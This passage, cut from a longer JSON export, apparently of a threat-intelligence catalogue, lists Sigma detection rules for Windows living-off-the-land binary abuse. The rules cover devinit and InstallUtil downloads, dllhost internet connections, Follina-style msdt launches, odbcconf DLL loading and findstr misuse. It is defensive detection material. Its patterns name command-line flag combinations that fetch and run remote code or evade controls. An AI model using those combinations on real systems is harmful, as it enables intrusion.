                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/01/11\ndescription: Detects a certain command line flag combination used by devinit.exe lolbin\n  to download arbitrary MSI packages on a Windows system\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - ' -t msi-install '\n    - ' -i http'\nfalsepositives:\n- Unknown\nid: 90d50722-0483-4065-8e35-57efaadd354d\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://twitter.com/mrd0x/status/1460815932402679809\nstatus: test\ntags:\n- attack.execution\n- attack.defense_evasion\n- attack.t1218\ntitle: DevInit Lolbin Download\n",
                            "sigma:id": "90d50722-0483-4065-8e35-57efaadd354d",
                            "title": "DevInit Lolbin Download",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "cfed2f44-16df-4bf3-833a-79405198b277",
                        "lookup_data": {
                            "description": "Detects Dllhost that communicates with public IP addresses",
                            "raw": "author: bartblaze\ndate: 2020/07/13\ndescription: Detects Dllhost that communicates with public IP addresses\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_ipv4:\n    DestinationIp|startswith:\n    - '10.'\n    - 192.168.\n    - 172.16.\n    - 172.17.\n    - 172.18.\n    - 172.19.\n    - 172.20.\n    - 172.21.\n    - 172.22.\n    - 172.23.\n    - 172.24.\n    - 172.25.\n    - 172.26.\n    - 172.27.\n    - 172.28.\n    - 172.29.\n    - 172.30.\n    - 172.31.\n    - 169.254.\n    - '127.'\n  filter_ipv6:\n    DestinationIp|startswith:\n    - ::1\n    - 0:0:0:0:0:0:0:1\n    - 'fe80:'\n    - fc\n    - fd\n  filter_msrange:\n    DestinationIp|startswith:\n    - 20.184.\n    - 20.185.\n    - 20.186.\n    - 20.187.\n    - 20.188.\n    - 20.189.\n    - 20.190.\n    - 20.191.\n    - 23.79.\n    - 51.10.\n    - 51.103.\n    - 51.104.\n    - 51.105.\n    - 52.239.\n  selection:\n    Image|endswith: \\dllhost.exe\n    Initiated: 'true'\nfalsepositives:\n- Communication to other corporate systems that use IP addresses from public address\n  spaces\nid: cfed2f44-16df-4bf3-833a-79405198b277\nlevel: medium\nlogsource:\n  category: network_connection\n  product: windows\nmodified: 2023/01/20\nreferences:\n- https://redcanary.com/blog/child-processes/\n- https://nasbench.medium.com/what-is-the-dllhost-exe-process-actually-running-ef9fe4c19c08\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218\n- attack.execution\n- attack.t1559.001\ntitle: Dllhost Internet Connection\n",
                            "sigma:id": "cfed2f44-16df-4bf3-833a-79405198b277",
                            "title": "Dllhost Internet Connection",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "654fcc6d-840d-4844-9b07-2c3300e54a26",
                        "lookup_data": {
                            "description": "Detects programs on a Windows system that should not write an archive to disk",
                            "raw": "author: frack113, Florian Roth\ndate: 2022/08/21\ndescription: Detects programs on a Windows system that should not write an archive\n  to disk\ndetection:\n  condition: selection\n  selection:\n    Image|endswith:\n    - \\winword.exe\n    - \\excel.exe\n    - \\powerpnt.exe\n    - \\msaccess.exe\n    - \\mspub.exe\n    - \\eqnedt32.exe\n    - \\visio.exe\n    - \\wordpad.exe\n    - \\wordview.exe\n    - \\certutil.exe\n    - \\certoc.exe\n    - \\CertReq.exe\n    - \\Desktopimgdownldr.exe\n    - \\esentutl.exe\n    - \\finger.exe\n    - \\notepad.exe\n    - \\AcroRd32.exe\n    - \\RdrCEF.exe\n    - \\mshta.exe\n    - \\hh.exe\n    TargetFilename|endswith:\n    - .zip\n    - .rar\n    - .7z\n    - .diagcab\n    - .appx\nfalsepositives:\n- Unknown\nid: 654fcc6d-840d-4844-9b07-2c3300e54a26\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nreferences:\n- https://github.com/Neo23x0/sysmon-config/blob/3f808d9c022c507aae21a9346afba4a59dd533b9/sysmonconfig-export-block.xml#L1326\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Legitimate Application Dropped Archive\n",
                            "sigma:id": "654fcc6d-840d-4844-9b07-2c3300e54a26",
                            "title": "Legitimate Application Dropped Archive",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f65e22f9-819e-4f96-9c7b-498364ae7a25",
                        "lookup_data": {
                            "description": "RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339).",
                            "raw": "author: frack113\ndate: 2021/07/13\ndescription: RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable\n  that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339).\ndetection:\n  condition: all of selection_*\n  selection_cmd:\n    HostApplication|contains: 'Invoke-ATHRemoteFXvGPUDisablementCommand '\n  selection_opt:\n    HostApplication|contains:\n    - '-ModuleName '\n    - '-ModulePath '\n    - '-ScriptBlock '\n    - -RemoteFXvGPUDisablementFilePath\nfalsepositives:\n- Unknown\nfields:\n- ComputerName\n- User\n- CommandLine\n- ParentCommandLine\nid: f65e22f9-819e-4f96-9c7b-498364ae7a25\nlevel: medium\nlogsource:\n  definition: fields have to be extract from event\n  product: windows\n  service: powershell-classic\nmodified: 2022/12/02\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md\n- https://github.com/redcanaryco/AtomicTestHarnesses/blob/7e1e4da116801e3d6fcc6bedb207064577e40572/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1\nrelated:\n- id: 38a7625e-b2cb-485d-b83d-aff137d859f4\n  type: derived\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Abusable Invoke-ATHRemoteFXvGPUDisablementCommand - PowerShell\n",
                            "sigma:id": "f65e22f9-819e-4f96-9c7b-498364ae7a25",
                            "title": "Abusable Invoke-ATHRemoteFXvGPUDisablementCommand - PowerShell",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "2267fe65-0681-42ad-9a6d-46553d3f3480",
                        "lookup_data": {
                            "description": "Detects uncommon or suspicious child processes spawning from a WSL process. This could indicate an attempt to evade parent/child relationship detections or persistence attempts via cron using WSL",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023/01/23\ndescription: Detects uncommon or suspicious child processes spawning from a WSL process.\n  This could indicate an attempt to evade parent/child relationship detections or\n  persistence attempts via cron using WSL\ndetection:\n  condition: selection_parent and 1 of selection_children_*\n  selection_children_images:\n    Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n    - \\cmd.exe\n    - \\calc.exe\n  selection_children_paths:\n    Image|contains:\n    - \\AppData\\Local\\Temp\\\n    - C:\\Users\\Public\\\n    - C:\\Windows\\Temp\\\n    - C:\\Temp\\\n    - \\Downloads\\\n    - \\Desktop\\\n  selection_parent:\n    ParentImage|endswith:\n    - \\wsl.exe\n    - \\wslhost.exe\nfalsepositives:\n- Unknown\nid: 2267fe65-0681-42ad-9a6d-46553d3f3480\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Wsl/\n- https://twitter.com/nas_bench/status/1535431474429808642\nrelated:\n- id: dec44ca7-61ad-493c-bfd7-8819c5faa09b\n  type: derived\nstatus: experimental\ntags:\n- attack.execution\n- attack.defense_evasion\n- attack.t1218\n- attack.t1202\ntitle: WSL Child Process Anomaly\n",
                            "sigma:id": "2267fe65-0681-42ad-9a6d-46553d3f3480",
                            "title": "WSL Child Process Anomaly",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f24bcaea-0cd1-11eb-adc1-0242ac120002",
                        "lookup_data": {
                            "description": "Atbroker executing non-deafualt Assistive Technology applications",
                            "raw": "author: Mateusz Wydra, oscd.community\ndate: 2020/10/12\ndescription: Atbroker executing non-deafualt Assistive Technology applications\ndetection:\n  condition: selection and not filter\n  filter:\n    CommandLine|contains:\n    - animations\n    - audiodescription\n    - caretbrowsing\n    - caretwidth\n    - colorfiltering\n    - cursorscheme\n    - filterkeys\n    - focusborderheight\n    - focusborderwidth\n    - highcontrast\n    - keyboardcues\n    - keyboardpref\n    - magnifierpane\n    - messageduration\n    - minimumhitradius\n    - mousekeys\n    - Narrator\n    - osk\n    - overlappedcontent\n    - showsounds\n    - soundsentry\n    - stickykeys\n    - togglekeys\n    - windowarranging\n    - windowtracking\n    - windowtrackingtimeout\n    - windowtrackingzorder\n  selection:\n    CommandLine|contains: start\n    Image|endswith: AtBroker.exe\nfalsepositives:\n- Legitimate, non-default assistive technology applications execution\nid: f24bcaea-0cd1-11eb-adc1-0242ac120002\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/\n- https://lolbas-project.github.io/lolbas/Binaries/Atbroker/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Suspicious Atbroker Execution\n",
                            "sigma:id": "f24bcaea-0cd1-11eb-adc1-0242ac120002",
                            "title": "Suspicious Atbroker Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "fde7929d-8beb-4a4c-b922-be9974671667",
                        "lookup_data": {
                            "description": "Detects SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions.",
                            "raw": "action: global\nauthor: \"Ensar \\u015Eamil, @sblmsrsn, OSCD Community\"\ndate: 2020/10/05\ndescription: Detects SyncAppvPublishingServer process execution which usually utilized\n  by adversaries to bypass PowerShell execution restrictions.\ndetection:\n  condition: selection\nfalsepositives:\n- App-V clients\nid: fde7929d-8beb-4a4c-b922-be9974671667\nlevel: medium\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: SyncAppvPublishingServer Execution to Bypass Powershell Restriction\n",
                            "sigma:id": "fde7929d-8beb-4a4c-b922-be9974671667",
                            "title": "SyncAppvPublishingServer Execution to Bypass Powershell Restriction",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "a85ffc3a-e8fd-4040-93bf-78aff284d801",
                        "lookup_data": {
                            "description": "Detects the usage of the \"sftp.exe\" binary as a LOLBIN by abusing the \"-D\" flag",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/11/10\ndescription: Detects the usage of the \"sftp.exe\" binary as a LOLBIN by abusing the\n  \"-D\" flag\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - ' -D ..'\n    - ' -D C:\\'\n    Image|endswith: \\sftp.exe\nfalsepositives:\n- Unknown\nid: a85ffc3a-e8fd-4040-93bf-78aff284d801\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/LOLBAS-Project/LOLBAS/pull/264\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.execution\n- attack.t1218\ntitle: Use Of The SFTP.EXE Binary As A LOLBIN\n",
                            "sigma:id": "a85ffc3a-e8fd-4040-93bf-78aff284d801",
                            "title": "Use Of The SFTP.EXE Binary As A LOLBIN",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "7a74da6b-ea76-47db-92cc-874ad90df734",
                        "lookup_data": {
                            "description": "Detects msdt.exe executed by a suspicious parent as seen in CVE-2022-30190 / Follina exploitation",
                            "raw": "author: Nextron Systems\ndate: 2022/06/01\ndescription: Detects msdt.exe executed by a suspicious parent as seen in CVE-2022-30190\n  / Follina exploitation\ndetection:\n  condition: all of selection_*\n  selection_msdt:\n  - Image|endswith: \\msdt.exe\n  - OriginalFileName: msdt.exe\n  selection_parent:\n    ParentImage|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n    - \\cmd.exe\n    - \\mshta.exe\n    - \\cscript.exe\n    - \\wscript.exe\n    - \\wsl.exe\n    - \\rundll32.exe\n    - \\regsvr32.exe\nfalsepositives:\n- Unknown\nid: 7a74da6b-ea76-47db-92cc-874ad90df734\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/07/14\nreferences:\n- https://twitter.com/nao_sec/status/1530196847679401984\n- https://app.any.run/tasks/713f05d2-fe78-4b9d-a744-f7c133e3fafb/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1036\n- attack.t1218\ntitle: MSDT Executed with Suspicious Parent\n",
                            "sigma:id": "7a74da6b-ea76-47db-92cc-874ad90df734",
                            "title": "MSDT Executed with Suspicious Parent",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "8e0bb260-d4b2-4fff-bb8d-3f82118e6892",
                        "lookup_data": {
                            "description": "Detects inline windows shell commands redirecting output via the \">\" symbol to a suspicious location",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/07/12\ndescription: Detects inline windows shell commands redirecting output via the \">\"\n  symbol to a suspicious location\ndetection:\n  condition: selection_img and 1 of selection_cli_*\n  selection_cli_1:\n    CommandLine|contains:\n    - '> %USERPROFILE%\\'\n    - '> %APPDATA%\\'\n    - '> \\Users\\Public\\'\n    - '> C:\\Users\\Public\\'\n    - '> %TEMP%\\'\n    - '> %TMP%\\'\n    - '> C:\\Windows\\Temp\\'\n    - '> C:\\Temp\\'\n  selection_cli_2:\n    CommandLine|contains:\n    - ' > '\n    - ' >> '\n    CommandLine|contains|all:\n    - C:\\Users\\\n    - \\AppData\\Local\\\n  selection_img:\n  - Image|endswith: \\cmd.exe\n  - OriginalFileName: Cmd.Exe\nfalsepositives:\n- Legitimate admin scripts\nid: 8e0bb260-d4b2-4fff-bb8d-3f82118e6892\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/19\nreferences:\n- https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/\nrelated:\n- id: aa2efee7-34dd-446e-8a37-40790a66efd7\n  type: derived\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1218\ntitle: Suspicious CMD Shell Redirect\n",
                            "sigma:id": "8e0bb260-d4b2-4fff-bb8d-3f82118e6892",
                            "title": "Suspicious CMD Shell Redirect",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "65d2be45-8600-4042-b4c0-577a1ff8a60e",
                        "lookup_data": {
                            "description": "Detects defence evasion attempt via odbcconf.exe execution to load DLL",
                            "raw": "author: Kirill Kiryanov, Beyu Denis, Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/25\ndescription: Detects defence evasion attempt via odbcconf.exe execution to load DLL\ndetection:\n  condition: all of selection_1_* or selection_2\n  selection_1_cli:\n    CommandLine|contains:\n    - -a\n    - -f\n    - /a\n    - /f\n    - regsvr\n  selection_1_name:\n  - Image|endswith: \\odbcconf.exe\n  - OriginalFileName: odbcconf.exe\n  selection_2:\n    Image|endswith: \\rundll32.exe\n    ParentImage|endswith: \\odbcconf.exe\nfalsepositives:\n- Legitimate use of odbcconf.exe by legitimate user\nid: 65d2be45-8600-4042-b4c0-577a1ff8a60e\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/30\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/\n- https://twitter.com/Hexacorn/status/1187143326673330176\n- https://redcanary.com/blog/raspberry-robin/\n- https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-94a1964b682707e4e3f77dd61a3bfface5401d08d8cf81145f388e09614aceca\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218.008\ntitle: Application Whitelisting Bypass via DLL Loaded by odbcconf.exe\n",
                            "sigma:id": "65d2be45-8600-4042-b4c0-577a1ff8a60e",
                            "title": "Application Whitelisting Bypass via DLL Loaded by odbcconf.exe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "fb0b815b-f5f6-4f50-970f-ffe21f253f7a",
                        "lookup_data": {
                            "description": "Extexport.exe loads dll and is execute from other folder the original path",
                            "raw": "author: frack113\ndate: 2021/11/26\ndescription: Extexport.exe loads dll and is execute from other folder the original\n  path\ndetection:\n  condition: selection\n  selection:\n  - CommandLine|contains: Extexport.exe\n  - Image|endswith: \\Extexport.exe\n  - OriginalFileName: extexport.exe\nfalsepositives:\n- Unknown\nid: fb0b815b-f5f6-4f50-970f-ffe21f253f7a\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/05/16\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Extexport/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Suspicious Extexport Execution\n",
                            "sigma:id": "fb0b815b-f5f6-4f50-970f-ffe21f253f7a",
                            "title": "Suspicious Extexport Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "38a7625e-b2cb-485d-b83d-aff137d859f4",
                        "lookup_data": {
                            "description": "RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339).",
                            "raw": "author: frack113\ndate: 2021/07/13\ndescription: RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable\n  that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339).\ndetection:\n  condition: all of selection_*\n  selection_cmd:\n    ContextInfo|contains: 'Invoke-ATHRemoteFXvGPUDisablementCommand '\n  selection_opt:\n    ContextInfo|contains:\n    - '-ModuleName '\n    - '-ModulePath '\n    - '-ScriptBlock '\n    - -RemoteFXvGPUDisablementFilePath\nfalsepositives:\n- Unknown\nid: 38a7625e-b2cb-485d-b83d-aff137d859f4\nlevel: medium\nlogsource:\n  category: ps_module\n  definition: 'Requirements: PowerShell Module Logging must be enabled'\n  product: windows\nmodified: 2023/01/04\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md\n- https://github.com/redcanaryco/AtomicTestHarnesses/blob/7e1e4da116801e3d6fcc6bedb207064577e40572/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Abusable Invoke-ATHRemoteFXvGPUDisablementCommand - PowerShell Module\n",
                            "sigma:id": "38a7625e-b2cb-485d-b83d-aff137d859f4",
                            "title": "Abusable Invoke-ATHRemoteFXvGPUDisablementCommand - PowerShell Module",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "bf6c39fc-e203-45b9-9538-05397c1b4f3f",
                        "lookup_data": {
                            "description": "Attackers can use findstr to hide their artifacts or search specific strings and evade defense mechanism",
                            "raw": "author: Furkan CALISKAN, @caliskanfurkan_, @oscd_initiative, Nasreddine Bencherchali\ndate: 2020/10/05\ndescription: Attackers can use findstr to hide their artifacts or search specific\n  strings and evade defense mechanism\ndetection:\n  condition: selection_findstr and (all of selection_cli_download* or all of selection_cli_creds*)\n  selection_cli_creds_1:\n    CommandLine|contains:\n    - ' /s '\n    - ' -s '\n  selection_cli_creds_2:\n    CommandLine|contains:\n    - ' /i '\n    - ' -i '\n  selection_cli_download_1:\n    CommandLine|contains:\n    - ' /v '\n    - ' -v '\n  selection_cli_download_2:\n    CommandLine|contains:\n    - ' /l '\n    - ' -l '\n  selection_findstr:\n  - CommandLine|contains: findstr\n  - Image|endswith: findstr.exe\n  - OriginalFileName: FINDSTR.EXE\nfalsepositives:\n- Administrative findstr usage\nid: bf6c39fc-e203-45b9-9538-05397c1b4f3f\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/11\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Findstr/\n- https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/\n- https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218\n- attack.t1564.004\n- attack.t1552.001\n- attack.t1105\ntitle: Abusing Findstr for Defense Evasion\n",
                            "sigma:id": "bf6c39fc-e203-45b9-9538-05397c1b4f3f",
                            "title": "Abusing Findstr for Defense Evasion",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "3a6586ad-127a-4d3b-a677-1e6eacdf8fde",
                        "lookup_data": {
                            "description": "Detects suspicious child processes of a Windows shell and scripting processes such as wscript, rundll32, powershell, mshta...etc.",
                            "raw": "author: Florian Roth (Nextron Systems), Tim Shelton\ndate: 2018/04/06\ndescription: Detects suspicious child processes of a Windows shell and scripting processes\n  such as wscript, rundll32, powershell, mshta...etc.\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_amazon:\n    ParentCommandLine|contains:\n    - \\Program Files\\Amazon\\WorkSpacesConfig\\Scripts\\setup-scheduledtask.ps1\n    - \\Program Files\\Amazon\\WorkSpacesConfig\\Scripts\\set-selfhealing.ps1\n    - \\Program Files\\Amazon\\WorkSpacesConfig\\Scripts\\check-workspacehealth.ps1\n    - \\nessus_\n  filter_ccmcache:\n    CurrentDirectory|contains: \\ccmcache\\\n  filter_nessus:\n    CommandLine|contains: \\nessus_\n  selection:\n    Image|endswith:\n    - \\schtasks.exe\n    - \\nslookup.exe\n    - \\certutil.exe\n    - \\bitsadmin.exe\n    - \\mshta.exe\n    ParentImage|endswith:\n    - \\mshta.exe\n    - \\powershell.exe\n    - \\pwsh.exe\n    - \\rundll32.exe\n    - \\cscript.exe\n    - \\wscript.exe\n    - \\wmiprvse.exe\n    - \\regsvr32.exe\nfalsepositives:\n- Administrative scripts\n- Microsoft SCCM\nfields:\n- CommandLine\n- ParentCommandLine\n- CurrentDirectory\n- Image\n- ParentImage\nid: 3a6586ad-127a-4d3b-a677-1e6eacdf8fde\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/19\nreferences:\n- https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html\nstatus: test\ntags:\n- attack.execution\n- attack.defense_evasion\n- attack.t1059.005\n- attack.t1059.001\n- attack.t1218\ntitle: Windows Shell/Scripting Processes Spawning Suspicious Programs\n",
                            "sigma:id": "3a6586ad-127a-4d3b-a677-1e6eacdf8fde",
                            "title": "Windows Shell/Scripting Processes Spawning Suspicious Programs",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "9c8c7000-3065-44a8-a555-79bcba5d9955",
                        "lookup_data": {
                            "description": "Detects execution of \"msdt.exe\" using an answer file which is simulating the legitimate way of calling msdt via \"pcwrun.exe\" (For example from the compatibility tab)",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/06/13\ndescription: Detects execution of \"msdt.exe\" using an answer file which is simulating\n  the legitimate way of calling msdt via \"pcwrun.exe\" (For example from the compatibility\n  tab)\ndetection:\n  condition: all of selection* and not filter\n  filter:\n    ParentImage|endswith: \\pcwrun.exe\n  selection_answer:\n    CommandLine|contains:\n    - ' -af '\n    - ' /af '\n  selection_cli:\n    CommandLine|contains: \\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml\n    Image|endswith: \\msdt.exe\nfalsepositives:\n- Possible undocumented parents of \"msdt\" other than \"pcwrun\"\nid: 9c8c7000-3065-44a8-a555-79bcba5d9955\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Msdt/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\n- attack.execution\ntitle: Execute MSDT Via Answer File\n",
                            "sigma:id": "9c8c7000-3065-44a8-a555-79bcba5d9955",
                            "title": "Execute MSDT Via Answer File",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "75edd216-1939-4c73-8d61-7f3a0d85b5cc",
                        "lookup_data": {
                            "description": "Detects the use the .NET InstallUtil.exe application in order to download arbitrary files. The files will be written to %LOCALAPPDATA%\\Microsoft\\Windows\\INetCache\\IE\\",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/08/19\ndescription: Detects the use the .NET InstallUtil.exe application in order to download\n  arbitrary files. The files will be written to %LOCALAPPDATA%\\Microsoft\\Windows\\INetCache\\IE\\\ndetection:\n  condition: all of selection_*\n  selection_cli:\n    CommandLine|contains:\n    - http://\n    - https://\n    - ftp://\n  selection_img:\n  - Image|endswith: \\InstallUtil.exe\n  - OriginalFileName: InstallUtil.exe\nfalsepositives:\n- Unknown\nid: 75edd216-1939-4c73-8d61-7f3a0d85b5cc\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/LOLBAS-Project/LOLBAS/pull/239\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Suspicious Execution of InstallUtil To Download\n",
                            "sigma:id": "75edd216-1939-4c73-8d61-7f3a0d85b5cc",
                            "title": "Suspicious Execution of InstallUtil To Download",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "729ce0ea-5d8f-4769-9762-e35de441586d",
                        "lookup_data": {
                            "description": "Detects a certain command line flag combination used by mpiexec.exe LOLBIN from HPC pack that can be used to execute any other binary",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/01/11\ndescription: Detects a certain command line flag combination used by mpiexec.exe LOLBIN\n  from HPC pack that can be used to execute any other binary\ndetection:\n  condition: all of selection*\n  selection_binary:\n  - Image|endswith: \\mpiexec.exe\n  - Imphash: d8b52ef6aaa3a81501bdfff9dbb96217\n  - Hashes|contains: IMPHASH=d8b52ef6aaa3a81501bdfff9dbb96217\n  selection_flags:\n    CommandLine|contains:\n    - ' /n 1 '\n    - ' -n 1 '\nfalsepositives:\n- Unknown\nid: 729ce0ea-5d8f-4769-9762-e35de441586d\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/03/04\nreferences:\n- https://twitter.com/mrd0x/status/1465058133303246867\n- https://docs.microsoft.com/en-us/powershell/high-performance-computing/mpiexec?view=hpc19-ps\nstatus: test\ntags:\n- attack.execution\n- attack.defense_evasion\n- attack.t1218\ntitle: MpiExec Lolbin\n",
                            "sigma:id": "729ce0ea-5d8f-4769-9762-e35de441586d",
                            "title": "MpiExec Lolbin",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e0b06658-7d1d-4cd3-bf15-03467507ff7c",
                        "lookup_data": {
                            "description": "Detects the creation of Usage Log files by the CLR (clr.dll). These files are named after the executing process once the assembly is finished executing for the first time in the (user) session context.",
                            "raw": "author: frack113, omkar72, oscd.community, Wojciech Lesicki\ndate: 2022/11/18\ndescription: Detects the creation of Usage Log files by the CLR (clr.dll). These files\n  are named after the executing process once the assembly is finished executing for\n  the first time in the (user) session context.\ndetection:\n  condition: selection\n  selection:\n    TargetFilename|endswith:\n    - \\UsageLogs\\cmstp.exe.log\n    - \\UsageLogs\\cscript.exe.log\n    - \\UsageLogs\\mshta.exe.log\n    - \\UsageLogs\\msxsl.exe.log\n    - \\UsageLogs\\regsvr32.exe.log\n    - \\UsageLogs\\rundll32.exe.log\n    - \\UsageLogs\\svchost.exe.log\n    - \\UsageLogs\\wscript.exe.log\n    - \\UsageLogs\\wmic.exe.log\nfalsepositives:\n- Rundll32.exe with zzzzInvokeManagedCustomActionOutOfProc in command line and msiexec.exe\n  as parent process - https://twitter.com/SBousseaden/status/1388064061087260675\nid: e0b06658-7d1d-4cd3-bf15-03467507ff7c\nlevel: high\nlogsource:\n  category: file_event\n  definition: 'Requirements: UsageLogs folder must be monitored by sysmon configuration'\n  product: windows\nmodified: 2023/01/05\nreferences:\n- https://bohops.com/2021/03/16/investigating-net-clr-usage-log-tampering-techniques-for-edr-evasion/\n- https://github.com/olafhartong/sysmon-modular/blob/fa1ae53132403d262be2bbd7f17ceea7e15e8c78/11_file_create/include_dotnet.xml\n- https://web.archive.org/web/20221026202428/https://gist.github.com/code-scrap/d7f152ffcdb3e0b02f7f394f5187f008\n- https://blog.menasec.net/2019/07/interesting-difr-traces-of-net-clr.html\n- https://bohops.com/2021/03/16/investigating-net-clr-usage-log-tampering-techniques-for-edr-evasion/\nrelated:\n- id: 4508a70e-97ef-4300-b62b-ff27992990ea\n  type: derived\n- id: e4b63079-6198-405c-abd7-3fe8b0ce3263\n  type: obsoletes\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: NET CLR Binary Execution Usage Log Artifact\n",
                            "sigma:id": "e0b06658-7d1d-4cd3-bf15-03467507ff7c",
                            "title": "NET CLR Binary Execution Usage Log Artifact",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "242301bc-f92f-4476-8718-78004a6efd9f",
                        "lookup_data": {
                            "description": "Detects when a user installs certificates by using CertOC.exe to loads the target DLL file.",
